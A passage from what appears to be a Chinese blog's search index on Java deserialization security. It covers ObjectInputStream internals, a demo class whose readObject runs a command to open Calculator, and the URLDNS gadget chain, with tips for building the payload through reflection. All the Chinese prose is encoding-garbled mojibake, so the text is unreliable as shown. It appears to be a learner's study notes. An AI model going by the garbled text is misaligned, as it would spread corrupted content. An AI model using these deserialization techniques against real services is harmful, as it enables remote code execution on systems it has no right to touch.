è¿›å»ã€‚\næ‰€ä»¥ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„LinkedHashMapå¯¹è±¡ï¼Œè€ŒåŸæ¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„Mapä¸å†æ‰§è¡Œsetæˆ–putæ“ä½œï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘RCEäº†ã€‚\n","permalink":"http://www.reus09.top/posts/tech/commonscollections1%E5%88%86%E6%9E%90/","summary":"Apache Commons Collections æ˜¯ä¸€ä¸ªæ‰©å±•äº† Java æ ‡å‡†åº“é‡Œçš„ Collection ç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æ„ç±»å‹å¹¶å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚ä½œä¸º Apache å¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼Œè¢«å¹¿æ³›","title":"CommonsCollections1åˆ†æ"},{"content":"è·Ÿç€su18å¸ˆå‚…å’Œpç¥ç»§ç»­å­¦ä¹ Javaå®‰å…¨ï¼Œåœ¨ä¹‹å‰å¯¹FastJsonçš„åˆ†æä¸­ï¼ŒFastJsonçš„åºåˆ—åŒ–æ¼æ´ä¸»è¦æ˜¯å¯¹å¯¹è±¡ååºåˆ—åŒ–è¿‡ç¨‹ä¸­getter,setteræ–¹æ³•çš„åˆ©ç”¨ï¼Œè¿™é‡Œå­¦ä¹ çš„ååºåˆ—åŒ–ä¸»è¦æ˜¯ç»§æ‰¿äº†Serializableæ¥å£ï¼Œé‡å†™äº†readObjectæ–¹æ³•çš„ååºåˆ—åŒ–çš„åˆ©ç”¨ã€‚\nåºåˆ—åŒ–å’Œååºåˆ—åŒ– Java ä¸­çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œå°±æ˜¯å°†ä¸€ä¸ª Java å¯¹è±¡å½“å‰çŠ¶æ€ä»¥å­—ç¬¦ä¸²ï¼ˆå­—èŠ‚åºåˆ—ï¼‰çš„å½¢å¼æè¿°å‡ºæ¥ï¼Œè¿™ä¸²å­—ç¬¦å¯èƒ½è¢«å‚¨å­˜/å‘é€åˆ°ä»»ä½•éœ€è¦çš„ä½ç½®ï¼Œåœ¨é€‚å½“çš„æ—¶å€™ï¼Œå†å°†å®ƒè½¬å›åŸæœ¬çš„ Java å¯¹è±¡ã€‚\nè¿™ä¸­é—´éœ€è¦ä¸€ä¸ªè§„åˆ™ï¼Œè§„åˆ™ä¸­æè¿°äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶ç©¶ç«Ÿè¯¥å¦‚ä½•æŠŠä¸€ä¸ªå¯¹è±¡å¤„ç†æˆå­—ç¬¦ä¸²ï¼Œåˆå¦‚ä½•æŠŠå­—ç¬¦ä¸²å˜å›å¯¹è±¡ï¼Œå› ä¸ºè¿™ä¸€è¿‡ç¨‹å¿…é¡»æ˜¯å¯é€†çš„ã€‚\nJava æä¾›äº†ä¸¤ä¸ªç±» java.io.ObjectOutputStream å’Œ java.io.ObjectInputStream æ¥å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„åŠŸèƒ½ï¼Œå…¶ä¸­ ObjectInputStream ç”¨äºæ¢å¤é‚£äº›å·²ç»è¢«åºåˆ—åŒ–çš„å¯¹è±¡ï¼ŒObjectOutputStream å°† Java å¯¹è±¡çš„åŸå§‹æ•°æ®ç±»å‹å’Œå›¾å½¢å†™å…¥ OutputStreamã€‚\nåœ¨ Java çš„ç±»ä¸­ï¼Œå¿…é¡»è¦å®ç° java.io.Serializable æˆ– java.io.Externalizable æ¥å£æ‰å¯ä»¥ä½¿ç”¨ï¼Œè€Œå®é™…ä¸Š Externalizable ä¹Ÿæ˜¯å®ç°äº† Serializable æ¥å£ã€‚\nObjectOutputStream ObjectOutputStream ç»§æ‰¿çš„çˆ¶ç±»æˆ–å®ç°çš„æ¥å£å¦‚ä¸‹ï¼š\nçˆ¶ç±» OutputStreamï¼šæ‰€æœ‰å­—èŠ‚è¾“å‡ºæµçš„é¡¶çº§çˆ¶ç±»ï¼Œç”¨æ¥æ¥æ”¶è¾“å‡ºçš„å­—èŠ‚å¹¶å‘é€åˆ°æŸäº›æ¥æ”¶å™¨ï¼ˆsinkï¼‰ã€‚ æ¥å£ ObjectOutputï¼šObjectOutput æ‰©å±•äº† DataOutput æ¥å£ï¼ŒDataOutput æ¥å£æä¾›äº†å°†æ•°æ®ä»ä»»ä½• Java åŸºæœ¬ç±»å‹è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—å¹¶å†™å…¥äºŒè¿›åˆ¶æµçš„åŠŸèƒ½ï¼ŒObjectOutput åœ¨ DataOutput æ¥å£åŸºç¡€ä¸Šæä¾›äº† writeObject æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ç±»ï¼ˆObjectï¼‰çš„å†™å…¥ã€‚ æ¥å£ ObjectStreamConstantsï¼šå®šä¹‰äº†ä¸€äº›åœ¨å¯¹è±¡åºåˆ—åŒ–æ—¶å†™å…¥çš„å¸¸é‡ã€‚å¸¸è§çš„ä¸€äº›çš„æ¯”å¦‚ STREAM_MAGICã€STREAM_VERSION ç­‰ã€‚ é€šè¿‡è¿™ä¸ªç±»çš„çˆ¶ç±»åŠçˆ¶æ¥å£ï¼Œæˆ‘ä»¬å¤§æ¦‚å¯ä»¥ç†è§£è¿™ä¸ªç±»æä¾›çš„åŠŸèƒ½ï¼šèƒ½å°† Java ä¸­çš„ç±»ã€æ•°ç»„ã€åŸºæœ¬æ•°æ®ç±»å‹ç­‰å¯¹è±¡è½¬æ¢ä¸ºå¯è¾“å‡ºçš„å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ååºåˆ—åŒ–ã€‚æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»ä¸­å‡ ä¸ªå…³é”®æ–¹æ³•ã€‚\nwriteObject è¿™æ˜¯ ObjectOutputStream å¯¹è±¡çš„æ ¸å¿ƒæ–¹æ³•ä¹‹ä¸€ï¼Œç”¨æ¥å°†ä¸€ä¸ªå¯¹è±¡å†™å…¥è¾“å‡ºæµä¸­ï¼Œä»»ä½•å¯¹è±¡ï¼ŒåŒ…æ‹¬å­—ç¬¦ä¸²å’Œæ•°ç»„ï¼Œéƒ½æ˜¯ç”¨ writeObject å†™å…¥åˆ°æµä¸­çš„ã€‚\nä¹‹å‰è¯´è¿‡ï¼Œåºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œå°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡å½“å‰çš„çŠ¶æ€æè¿°ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯ Object -\u0026gt; OutputStream çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªè¿‡ç¨‹ç”± writeObject å®ç°ã€‚writeObject æ–¹æ³•è´Ÿè´£ä¸ºæŒ‡å®šçš„ç±»ç¼–å†™å…¶å¯¹è±¡çš„çŠ¶æ€ï¼Œä»¥ä¾¿åœ¨åé¢å¯ä»¥ä½¿ç”¨ä¸ä¹‹å¯¹åº” readObject æ–¹æ³•æ¥æ¢å¤å®ƒã€‚\nwriteUnshared ç”¨äºå°†éå…±äº«å¯¹è±¡å†™å…¥ ObjectOutputStreamï¼Œå¹¶å°†ç»™å®šçš„å¯¹è±¡ä½œä¸ºåˆ·æ–°å¯¹è±¡å†™å…¥æµä¸­ã€‚\nä½¿ç”¨ writeUnshared æ–¹æ³•ä¼šä½¿ç”¨ BlockDataOutputStream çš„æ–°å®ä¾‹è¿›è¡Œåºåˆ—åŒ–æ“ä½œï¼Œä¸ä¼šä½¿ç”¨åŸæ¥ OutputStream çš„å¼•ç”¨å¯¹è±¡ã€‚\nwriteObject0 writeObject å’Œ writeUnshared å®é™…ä¸Šè°ƒç”¨ writeObject0 æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ writeObject0æ˜¯ä¸Šé¢ä¸¤ä¸ªæ–¹æ³•çš„åŸºç¡€å®ç°ã€‚å…·ä½“çš„å®ç°æµç¨‹å°†ä¼šåœ¨åé¢å†è¿›è¡Œè¯¦ç»†ç ”ç©¶ã€‚\nwriteObjectOverride å¦‚æœ ObjectOutputStream ä¸­çš„ enableOverride å±æ€§ä¸º trueï¼ŒwriteObject æ–¹æ³•å°†ä¼šè°ƒç”¨ writeObjectOverrideï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ç”± ObjectOutputStream çš„å­ç±»å®ç°çš„ã€‚\nåœ¨ç”±å®Œå…¨é‡æ–°å®ç° ObjectOutputStream çš„å­ç±»å®Œæˆåºåˆ—åŒ–åŠŸèƒ½æ—¶ï¼Œå°†ä¼šè°ƒç”¨å®ç°ç±»çš„ writeObjectOverride æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚\nObjectInputStream ObjectInputStream ç»§æ‰¿çš„çˆ¶ç±»æˆ–å®ç°çš„æ¥å£å¦‚ä¸‹ï¼š\nçˆ¶ç±» InputStreamï¼šæ‰€æœ‰å­—èŠ‚è¾“å…¥æµçš„é¡¶çº§çˆ¶ç±»ã€‚ æ¥å£ ObjectInputï¼šObjectInput æ‰©å±•äº† DataInput æ¥å£ï¼ŒDataInput æ¥å£æä¾›äº†ä»äºŒè¿›åˆ¶æµè¯»å–å­—èŠ‚å¹¶å°†å…¶é‡æ–°è½¬æ¢ä¸º Java åŸºç¡€ç±»å‹çš„åŠŸèƒ½ï¼ŒObjectInput é¢å¤–æä¾›äº† readObject æ–¹æ³•ç”¨æ¥è¯»å–ç±»ã€‚ æ¥å£ ObjectStreamConstantsï¼šåŒä¸Šã€‚ ObjectInputStream å®ç°äº†ååºåˆ—åŒ–åŠŸèƒ½ï¼Œçœ‹ä¸€ä¸‹å…¶ä¸­çš„å…³é”®æ–¹æ³•ã€‚\nreadObject ä» ObjectInputStream è¯»å–ä¸€ä¸ªå¯¹è±¡ï¼Œå°†ä¼šè¯»å–å¯¹è±¡çš„ç±»ã€ç±»çš„ç­¾åã€ç±»çš„é transient å’Œé static å­—æ®µçš„å€¼ï¼Œä»¥åŠå…¶æ‰€æœ‰çˆ¶ç±»ç±»å‹ã€‚\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ writeObject å’Œ readObject æ–¹æ³•ä¸ºä¸€ä¸ªç±»é‡å†™é»˜è®¤çš„ååºåˆ—åŒ–æ‰§è¡Œæ–¹ï¼Œæ‰€ä»¥å…¶ä¸­ readObject æ–¹æ³•ä¼š â€œä¼ é€’æ€§â€ çš„æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œä¼šè°ƒç”¨ååºåˆ—åŒ–ç±»çš„ readObject æ–¹æ³•ï¼Œä»¥å®Œæ•´çš„é‡æ–°ç”Ÿæˆè¿™ä¸ªç±»çš„å¯¹è±¡ã€‚\nreadUnshared ä» ObjectInputStream è¯»å–ä¸€ä¸ªéå…±äº«å¯¹è±¡ã€‚ æ­¤æ–¹æ³•ä¸ readObject ç±»ä¼¼ï¼Œä¸åŒç‚¹åœ¨äºreadUnshared ä¸å…è®¸åç»­çš„ readObject å’Œ readUnshared è°ƒç”¨å¼•ç”¨è¿™æ¬¡è°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„å¯¹è±¡ã€‚\nreadObject0 readObject å’Œ readUnshared å®é™…ä¸Šè°ƒç”¨ readObject0 æ–¹æ³•ï¼ŒreadObject0æ˜¯ä¸Šé¢ä¸¤ä¸ªæ–¹æ³•çš„åŸºç¡€å®ç°ã€‚\nreadObjectOverride ç”± ObjectInputStream å­ç±»è°ƒç”¨ï¼Œä¸ writeObjectOverride ä¸€è‡´ã€‚\né€šè¿‡ä¸Šé¢å¯¹ ObjectOutputStream å’Œ ObjectInputStream çš„äº†è§£ï¼Œä¸¤ä¸ªç±»çš„å®ç°å‡ ä¹æ˜¯ä¸€ç§å¯¹ç§°çš„ã€åŒç”Ÿçš„æ–¹å¼è¿›è¡Œã€‚\nååºåˆ—åŒ–æ¼æ´ åœ¨å‰é¢æåˆ°è¿‡ï¼Œä¸€ä¸ªç±»æƒ³è¦å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå¿…é¡»è¦å®ç° java.io.Serializable æˆ– java.io.Externalizable æ¥å£ã€‚\nSerializable æ¥å£æ˜¯ä¸€ä¸ªæ ‡è®°æ¥å£ï¼Œæ ‡è®°äº†è¿™ä¸ªç±»å¯ä»¥è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œè€Œ Externalizable æ¥å£åœ¨ Serializable æ¥å£åŸºç¡€ä¸Šï¼Œåˆæä¾›äº† writeExternal å’Œ readExternal æ–¹æ³•ï¼Œç”¨æ¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸€äº›å¤–éƒ¨å…ƒç´ ã€‚\nå…¶ä¸­ï¼Œå¦‚æœè¢«åºåˆ—åŒ–çš„ç±»é‡å†™äº† writeObject å’Œ readObject æ–¹æ³•ï¼ŒJava å°†ä¼šå§”æ‰˜ä½¿ç”¨è¿™ä¸¤ä¸ªæ–¹æ³•æ¥è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ“ä½œã€‚\næ­£æ˜¯å› ä¸ºè¿™ä¸ªç‰¹æ€§ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´çš„å‡ºç°ï¼šåœ¨ååºåˆ—åŒ–ä¸€ä¸ªç±»æ—¶ï¼Œå¦‚æœå…¶é‡å†™äº† readObject æ–¹æ³•ï¼Œç¨‹åºå°†ä¼šè°ƒç”¨å®ƒï¼Œå¦‚æœè¿™ä¸ªæ–¹æ³•ä¸­å­˜åœ¨ä¸€äº›æ¶æ„çš„è°ƒç”¨ï¼Œåˆ™ä¼šå¯¹åº”ç”¨ç¨‹åºé€ æˆå±å®³ã€‚\nè¿™é‡Œï¼Œæˆ‘ä»¬ä»¥ä¸€ä¸ªdemoç¨‹åºä¸ºä¾‹å­ï¼Œç¼–å†™äº†Personç±»ï¼Œç»§æ‰¿äº†Serializableæ¥å£ï¼Œå¹¶ä¸”åœ¨readObjectæ–¹æ³•ä¸­é‡å†™äº†æ¶æ„ä»£ç ï¼Œä½¿å…¶èƒ½å¤Ÿå¼¹å‡ºè®¡ç®—å™¨æ¡†ã€‚\nç„¶åæˆ‘ä»¬å°†è¿™ä¸ªç±»åºåˆ—åŒ–å¹¶å†™åœ¨æ–‡ä»¶ä¸­ï¼Œéšåå¯¹å…¶è¿›è¡Œååºåˆ—åŒ–ï¼Œå°±è§¦å‘äº†å‘½ä»¤æ‰§è¡Œã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 package Basic; import java.io.*; /** * @ClassName Person * @Description TODO * @Author reus09 * @Date 2022/10/23 15:15 * @Version 1.0 **/ public class Person implements Serializable { private String name; private int age; public Person(String name, int age) throws IOException { this.name = name; this.age = age; } private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException { Runtime.getRuntime().exec(\u0026#34;open -a Calculator.app\u0026#34;); } public static void main(String[] args) throws IOException, ClassNotFoundException { Person person = new Person(\u0026#34;reus09\u0026#34;, 21); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;abc.txt\u0026#34;)); oos.writeObject(person); oos.close(); FileInputStream fis = new FileInputStream(\u0026#34;abc.txt\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } readObjectçš„å…·ä½“æµç¨‹ ä¸ºä»€ä¹ˆreadObjectä¼šè§¦å‘ååºåˆ—åŒ–å‘¢ï¼Œæˆ‘ä»¬å…·ä½“èµ°ä¸€ä¸‹æµç¨‹ï¼Œçœ‹ä¸€ä¸‹å…·ä½“æ¯ä¸ªæ­¥éª¤çš„ä»£ç ã€‚\né¦–å…ˆï¼Œåœ¨readObjectæ–¹æ³•ä¸­è°ƒç”¨äº†readObject0æ–¹æ³•ååºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚\nç„¶åreadObject0æ˜¯ä»¥å­—èŠ‚çš„æ–¹å¼å»è¯»æ•°æ®ï¼Œå¦‚æœè¯»å–åˆ°0x73ï¼Œåˆ™ä»£è¡¨è¿™æ˜¯ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ï¼Œå°†ä¼šè°ƒç”¨ readOrdinaryObject æ–¹æ³•è¿›è¡Œå¤„ç†\nç„¶ååœ¨readOrdinaryObjectæ–¹æ³•ä¸­ï¼Œå…ˆè°ƒç”¨readClassDescè¯»å–ç±»æè¿°ç¬¦ï¼Œå¹¶æ ¹æ®å…¶ä¸­çš„å†…å®¹è¿›è¡Œä¸€äº›æ¡ä»¶åˆ¤æ–­ï¼Œæ¯”å¦‚æ˜¯å¦æ˜¯String,Class,ObjectStreamClassçš„ç±»ï¼Œç„¶ååˆ¤æ–­å…¶ç»§æ‰¿çš„æ˜¯å¦æ˜¯Externalizableæ¥å£ï¼Œå¦‚æœæ˜¯å°±æ‰§è¡ŒreadExternalDataæ–¹æ³•ï¼Œå¦åˆ™å°±æ‰§è¡ŒreadSerialDataæ–¹æ³•ã€‚\nåœ¨readSerialDataæ–¹æ³•ä¸­ï¼Œé€šè¿‡ç±»æè¿°ç¬¦çš„getClassDataLayoutæ–¹æ³•è·å¾—äº†åºåˆ—åŒ–å¯¹è±¡çš„æ•°æ®å¸ƒå±€ï¼Œé€šè¿‡å¸ƒå±€çš„ hasReadObjectMethod æ–¹æ³•åˆ¤æ–­å¯¹è±¡æ˜¯å¦æœ‰é‡å†™ readObject æ–¹æ³•ï¼Œå¦‚æœæœ‰ï¼Œåˆ™ä½¿ç”¨ invokeReadObject æ–¹æ³•è°ƒç”¨å¯¹è±¡ä¸­çš„ readObject ã€‚\næœ€ååœ¨invokeReadObjectæ–¹æ³•ä¸­ç»è¿‡ä¸€ç³»åˆ—åˆå§‹åŒ–çš„è°ƒç”¨ï¼Œæœ€åæ‰§è¡Œæˆ‘ä»¬ååºåˆ—åŒ–åçš„å¯¹è±¡çš„readObjectæ–¹æ³•ã€‚\né€šè¿‡ä¸Šè¿°åˆ†æï¼Œæˆ‘ä»¬å°±äº†è§£äº†ååºåˆ—åŒ–æ¼æ´çš„è§¦å‘åŸå› ã€‚ä¸ååºåˆ—æ¼æ´çš„è§¦å‘æ–¹å¼ç›¸åŒï¼Œåœ¨åºåˆ—åŒ–æ—¶ï¼Œå¦‚æœä¸€ä¸ªç±»é‡å†™äº† writeObject æ–¹æ³•ï¼Œå¹¶ä¸”å…¶ä¸­äº§ç”Ÿæ¶æ„è°ƒç”¨ï¼Œåˆ™å°†ä¼šå¯¼è‡´æ¼æ´ï¼Œå½“ç„¶åœ¨å®é™…ç¯å¢ƒä¸­ï¼Œåºåˆ—åŒ–çš„æ•°æ®æ¥è‡ªä¸å¯ä¿¡æºçš„æƒ…å†µæ¯”è¾ƒå°‘è§ã€‚\nURLDNS æ ¹æ®su18å¸ˆå‚…æ‰€æè¿°ï¼Œä¸€ä¸ªèƒ½æˆåŠŸæ‰§è¡Œçš„ååºåˆ—åŒ–è°ƒç”¨é“¾éœ€è¦ä¸‰ä¸ªå…ƒç´ ï¼šâ€œkick-offâ€ã€â€œsinkâ€ã€â€œchainâ€ã€‚ç¿»è¯‘æˆä¸­æ–‡æ¥è¯´å°±æ˜¯ â€œå…¥å£ç‚¹ï¼ˆé‡å†™äº† readObject çš„ç±»ï¼‰â€ã€â€œsink ç‚¹ï¼ˆæœ€ç»ˆæ‰§è¡Œæ¶æ„åŠ¨ä½œçš„ç‚¹ï¼šRCEï¼‰â€ã€â€œchain ï¼ˆä¸­é—´çš„è°ƒç”¨é“¾ï¼‰â€ã€‚\nURLDNS æ˜¯é€‚åˆæ–°æ‰‹åˆ†æçš„ååºåˆ—åŒ–é“¾ï¼Œåªä¾èµ–åŸç”Ÿç±»ï¼Œæ²¡æœ‰ jdk ç‰ˆæœ¬é™åˆ¶ï¼Œä¹Ÿè¢« ysoserial æ¶µç›–åœ¨å…¶ä¸­ã€‚å®ƒä¸ä¼šæ‰§è¡Œå‘½ä»¤ï¼Œåªä¼šè§¦å‘ DNS è§£æï¼Œå› æ­¤é€šå¸¸ç”¨æ¥æ¢æµ‹æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚\nè¿™ä¸ªæ¼æ´å…³é”®ç‚¹æ˜¯ Java å†…ç½®çš„ java.net.URL ç±»ï¼Œè¿™ä¸ªç±»çš„ equals å’Œ hashCode æ–¹æ³•å…·æœ‰ä¸€ä¸ªæœ‰è¶£çš„ç‰¹æ€§ï¼šåœ¨å¯¹ URL å¯¹è±¡è¿›è¡Œæ¯”è¾ƒæ—¶ï¼ˆä½¿ç”¨ equals æ–¹æ³•æˆ– hashCode æ–¹æ³•ï¼‰ï¼Œä¼šè§¦å‘ä¸€æ¬¡ DNS è§£æï¼Œå› ä¸ºå¯¹äº URL æ¥è¯´ï¼Œå¦‚æœä¸¤ä¸ªä¸»æœºåï¼ˆhostï¼‰éƒ½å¯ä»¥è§£æä¸ºç›¸åŒçš„ IP åœ°å€ï¼Œåˆ™è¿™ä¸¤ä¸ªä¸»æœºä¼šè¢«è®¤ä¸ºæ˜¯ç›¸åŒçš„ã€‚\nä¸‹é¢æˆ‘ä»¬ç€é‡åˆ†æä¸€ä¸‹equalsæ–¹æ³•å’ŒhashCodeæ–¹æ³•ï¼Œå­¦ä¹ ä¸€ä¸‹ä¸ºä»€ä¹ˆå®ƒèƒ½å¤Ÿè§¦å‘DNSè§£æã€‚\nURL.equals é¦–å…ˆåœ¨URL#equalsæ–¹æ³•é‡å†™äº†å¯¹Objectçš„åˆ¤æ–­ï¼Œå¦‚æœobjä¸æ˜¯URLç±»ï¼Œç›´æ¥è¿”å›falseï¼Œç„¶åè°ƒç”¨java.net.URLStreamHandler#equalsè¿›è¡Œåˆ¤æ–­ã€‚\nURLStreamHandler#equals æ–¹æ³•åˆ¤æ–­ URL å¯¹è±¡çš„é”šç‚¹æ˜¯å¦ç›¸åŒï¼Œå¹¶è°ƒç”¨ sameFile æ–¹æ³•æ¯”è¾ƒä¸¤ä¸ª URLï¼Œçœ‹å®ƒä»¬æ˜¯å¦å¼•ç”¨äº†ç›¸åŒçš„ protocol(åè®®)ã€host(ä¸»æœº)ã€port(ç«¯å£)ã€path(è·¯å¾„)ã€‚\nsameFileåŒæ—¶è¿˜è°ƒç”¨äº†hostsEqualsæ¥æŸ¥çœ‹å…¶hostä¸»æœºæ˜¯å¦ç›¸åŒã€‚\nåœ¨hostEqualæ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†getHostAddressæ–¹æ³•æ¥è·å–ä¸»æœºçš„åœ°å€ã€‚\nåœ¨getHostAddressæ–¹æ³•ä¸­é€šè¿‡getByNameç›¸å½“äºå°†ä¼ å…¥çš„hostè¿›è¡Œdnsè§£æï¼Œè·å–IP,ä»è€Œå®ç°äº†è§¦å‘DNSè§£æ\nURL.hashcode æ­¤æ–¹æ³•å°†ä¸€ä¸ªå¯¹è±¡æ˜ å°„ä¸ºä¸€ä¸ªæ•´å‹çš„å€¼ï¼Œé€šå¸¸ä¸ equals æ–¹æ³•åŒæ—¶å‡ºç°ã€‚\nå½“ equals æ–¹æ³•è¢«é‡å†™æ—¶ï¼ŒhashCode ä¹Ÿéœ€è¦è¢«é‡å†™ã€‚æŒ‰ç…§ä¸€èˆ¬ hashCode æ–¹æ³•çš„å®ç°æ¥è¯´ï¼Œå¦‚æœä¸¤ä¸ªå¯¹è±¡é€šè¿‡ equals æ–¹æ³•åˆ¤æ–­ç›¸åŒï¼Œé‚£å®ƒä»¬çš„ hash code ä¸€å®šç›¸ç­‰ã€‚\nURL çš„ hashCode æ–¹æ³•ä¹Ÿè¿›è¡Œäº†é‡å†™ï¼Œè°ƒç”¨äº† URLStreamHandler#hashCode æ–¹æ³•ã€‚åœ¨æ­¤ä¹‹å‰æœ‰ä¸€ä¸ªåˆ¤æ–­ï¼Œé‚£å°±æ˜¯ hashCode != -1ï¼Œ\nåŒæ ·åœ¨URLStreamHandler#hashCodeæ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†getHostAddressæ–¹æ³•æ¥å®ç°DNSè§£æã€‚\nKick-off:HashMap ä¸Šé¢å…³äºURLè§¦å‘DNSè§£æçš„equal,hashcodeæ–¹æ³•å®é™…ä¸Šå°±æ˜¯è¿™æ¡ååºåˆ—åŒ–é“¾çš„sink,é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆå»ºç«‹ä¸€ä¸ªkick-offæ¥ä½œä¸ºè¿™æ¡é“¾çš„å…¥å£ï¼Œå°±ç‰µæ‰¯åˆ°ä¸»è§’java.util.HashMap,åŒæ ·ç»§æ‰¿äº†Serializableæ¥å£ã€‚\né‚£ä¹ˆæˆ‘ä»¬å°±çœ‹ä¸€ä¸‹HashMapæ˜¯å¦‚ä½•åœ¨readObjectæ–¹æ³•ä¸­å­˜åœ¨æˆ‘ä»¬çš„kick-offç‚¹.\nçœç•¥æ‰å‰é¢å„ç§åˆå§‹åŒ–çš„ä»£ç ï¼Œå°†åºåˆ—åŒ–å¯¹è±¡ä¸­çš„é”®å€¼è¿›è¡Œ for å¾ªç¯ï¼Œå¹¶è°ƒç”¨é‡Œé¢çš„ key å’Œ value å¯¹è±¡çš„ readObject æ–¹æ³•ååºåˆ—åŒ– key å’Œ value çš„å€¼åï¼Œä½¿ç”¨ putVal (1.7 æ˜¯ putForCreate æ–¹æ³•) å°†è¿™äº›é”®ã€å€¼ä»¥åŠç›¸å…³çš„ hash ç­‰ä¿¡æ¯å†™å…¥ HashMap çš„å±æ€§ table ä¸­ã€‚\nHashMap é€šè¿‡ä¸€ä¸ªé™æ€æ–¹æ³• hash è®¡ç®— key å¯¹è±¡çš„ hash å€¼ï¼Œå¦‚æœ key ä¸º nullï¼Œ åˆ™å€¼ä¸º 0 ï¼Œå¦åˆ™å°†è°ƒç”¨ key çš„ hashCode æ–¹æ³•è®¡ç®— hashCode å€¼ï¼Œå†å’Œä½ç§» 16 ä½çš„ç»“æœè¿›è¡Œå¼‚æˆ–å¾—å‡º hash å€¼ã€‚\nä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ååºåˆ—åŒ–ä¸€ä¸ª HashMap æ—¶ï¼Œä¼šè°ƒç”¨å…¶ä¸­çš„ key å¯¹è±¡çš„ hashCode æ–¹æ³•è®¡ç®— hash å€¼ã€‚å¦‚æœååºåˆ—åŒ–ä¸€ä¸ª HashMap å¯¹è±¡ä¸­çš„ key æ˜¯URLå¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šè°ƒç”¨è¿™ä¸ª URL å¯¹è±¡çš„ hashCode æ–¹æ³•ï¼Œè§¦å‘ DNS è§£ææŸ¥è¯¢ã€‚è¿™ä¸ªé€»è¾‘å°±æ˜¯ URLDNS è¿™æ¡ååºåˆ—åŒ–åˆ©ç”¨çš„ gadget çš„åŸºæœ¬åŸç†ã€‚\næ³¨æ„ç‚¹ 1ã€åœ¨ä½¿ç”¨ HashMap çš„ put æ–¹æ³•æ—¶ï¼Œä¹Ÿæ˜¯è°ƒç”¨ putVal æ–¹æ³•ï¼Œä¼šå¯¹ key è¿›è¡Œ hashï¼Œè§¦å‘è§£æã€‚å¦‚æœæˆ‘ä»¬ä¸æƒ³åœ¨ç”Ÿæˆ payload æ—¶è§¦å‘ DNS è§£æï¼Œå°±è¦ä½¿ç”¨åå°„å°†å€¼æ”¾è¿›å»ã€‚\n2ã€åœ¨ URL å¯¹è±¡æœ‰ä¸€ä¸ªå±æ€§ hashCodeï¼Œé»˜è®¤æ˜¯ -1ï¼Œä½¿ç”¨hashCode æ–¹æ³•è®¡ç®—æ—¶ä¼šåœ¨ hashCode å±æ€§ä¸­ç¼“å­˜å·²ç»è®¡ç®—è¿‡çš„å€¼ï¼Œå¦‚æœå†æ¬¡è®¡ç®—å°†ç›´æ¥è¿”å›å€¼ï¼Œä¸ä¼šåœ¨è§¦å‘ URLStreamHandler çš„ hashCode æ–¹æ³•ï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘æ¼æ´ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ç”Ÿæˆçš„ HashMap ä¸­çš„ URL å‚æ•°çš„ hashCode å€¼åœ¨ååºåˆ—åŒ–æ—¶ä¸º -1ï¼Œè€Œåˆšæ‰è¯´è¿‡ï¼Œå¦‚æœä½¿ç”¨ put æ–¹æ³•ï¼Œä¼šè°ƒç”¨ä¸€æ¬¡ key çš„ hash è®¡ç®—ï¼Œä¹Ÿå°±æ˜¯ URL çš„ hashCode æ–¹æ³•ï¼Œè¿™æ ·å°±æŠŠ hashCode ç¼“å­˜äº†ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å°±ä¸ä¼šè§¦å‘ URLStreamHandler çš„ hashCode æ–¹æ³•ä»¥åŠåé¢çš„é€»è¾‘ã€‚\næ‰€ä»¥æœ‰ä¸¤ç§æ€è·¯è§£å†³è¿™ä¸ªé—®é¢˜ï¼š\nç›´æ¥åå°„è°ƒç”¨ HashMap çš„ putVal æ–¹æ³•ç»•è¿‡ hash è®¡ç®—ã€‚ï¼ˆç”±äº JDK 1.7 